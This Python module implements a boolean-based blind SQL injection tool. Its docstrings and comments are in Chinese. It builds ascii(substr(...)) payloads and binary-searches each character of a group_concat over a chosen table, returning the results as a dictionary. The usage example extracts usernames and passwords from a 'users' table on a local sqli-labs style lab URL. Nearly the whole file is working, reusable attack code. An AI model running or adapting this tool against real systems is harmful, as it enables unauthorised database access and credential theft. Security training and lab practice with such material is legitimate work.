"""
布尔盲注流程（从 sqli_blind.py 抽出）。

职责：
    只负责"怎么猜数据"：
      1. 逐位二分查找字符的 ASCII 码；
      2. 把猜出的长字符串还原成 {列1: 列2}。

依赖：
    sqli_blind.SQLInjection 提供 HTTP 请求、参数解析、判断标志探测等基础能力，
    本类只继承并补充盲注流程，不重复实现这些逻辑。

用法：
    from Bool_sqli import BoolSQLi

    with BoolSQLi(
        url="http://127.0.0.1:8082/Less-8/?id=1",
        table_name="users",
        columns=["username", "password"],
        prefix="-1'",
        suffix=" -- ",
        op="OR",
    ) as tool:
        data = tool.run()      # 自动探测标志 + 二分猜解
        print(data)
        会持续更新
"""

import requests

from sqli_blind import SQLInjection


class BoolSQLi(SQLInjection):
    """布尔盲注：逐位二分猜解，并把结果还原为字典。"""

    def run(self):
        # 一步完成：没有判断标志就先自动探测，然后逐字符猜解
        if not self.keyword and not self.detect_keyword():
            return None
        return self.blind_sql()

    def blind_sql(self):
        # 逐位二分：ascii(substr(...)) > mid，真则往大找，假则记下 mid 往小找
        if not self.keyword:
            self.log_error("还没有判断标志（keyword），请先调用 detect_keyword()，或构造时手动传 keyword")
            return None

        param = self._resolve_param()
        inner_query = f"select group_concat({self.concat_target}) from {self.table_name}"

        result = ""
        for pos in range(1, self.max_length + 1):   # 内置函数 range()：生成 1 ~ max_length 的字符位置序号
            lo = 0
            hi = 127
            found_ascii = -1
            while lo <= hi:
                mid = (lo + hi) // 2
                payload = (f"{self.prefix} {self.op} "
                           f"ascii(substr(({inner_query}),{pos},1))> {mid}"
                           f"{self.suffix}")
                try:
                    resp = self._get(param, payload)
                except requests.RequestException as ex:
                    self.log_error(f"第 {pos} 位试字符, 二分 mid:{mid} 请求异常，跳过：{ex}")
                    found_ascii = 0
                    break

                if self.keyword in resp.text:
                    lo = mid + 1
                else:
                    found_ascii = mid
                    hi = mid - 1
            if found_ascii <= 0:
                self.log_info(f"第 {pos} 位无效字符")
                break
            char = chr(found_ascii)   # 内置函数 chr()：把 ASCII 码转回字符
            result += char

            self.log_info(f"第 {pos} 位 = {mid}  -> 当前结果{result}")

        current_dict = {}
        records = result.split(",")
        for record in records:
            if ":" in record:
                data = record.split(":")
                if len(data) == 2:   # 内置函数 len()：只有拆成两段才是"列1:列2"
                    key = data[0].strip()
                    value = data[1].strip()
                    current_dict[key] = value
            else:
                current_dict[record.strip()] = ""

        if current_dict:
            return current_dict

        return {}
